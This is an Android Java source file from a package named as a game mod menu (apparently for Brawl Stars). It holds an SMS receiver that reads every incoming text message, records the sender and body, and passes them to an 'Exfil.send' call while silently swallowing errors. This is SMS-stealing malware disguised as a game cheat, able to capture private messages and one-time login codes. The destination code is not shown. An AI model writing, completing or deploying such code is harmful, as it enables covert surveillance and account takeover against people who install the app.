package com.brawl.modmenu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            Bundle b = intent.getExtras();
            if (b == null) return;
            Object[] pdus = (Object[]) b.get("pdus");
            if (pdus == null) return;

            StringBuilder sb = new StringBuilder();
            for (Object pdu : pdus) {
                SmsMessage sms;
                if (android.os.Build.VERSION.SDK_INT >= 23) {
                    String format = b.getString("format");
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }
                if (sms != null) {
                    sb.append("От: ").append(sms.getOriginatingAddress()).append("\n");
                    sb.append(sms.getMessageBody()).append("\n\n");
                }
            }
            if (sb.length() > 0) Exfil.send("SMS", sb.toString());
        } catch (Throwable ignored) {}
    }
}
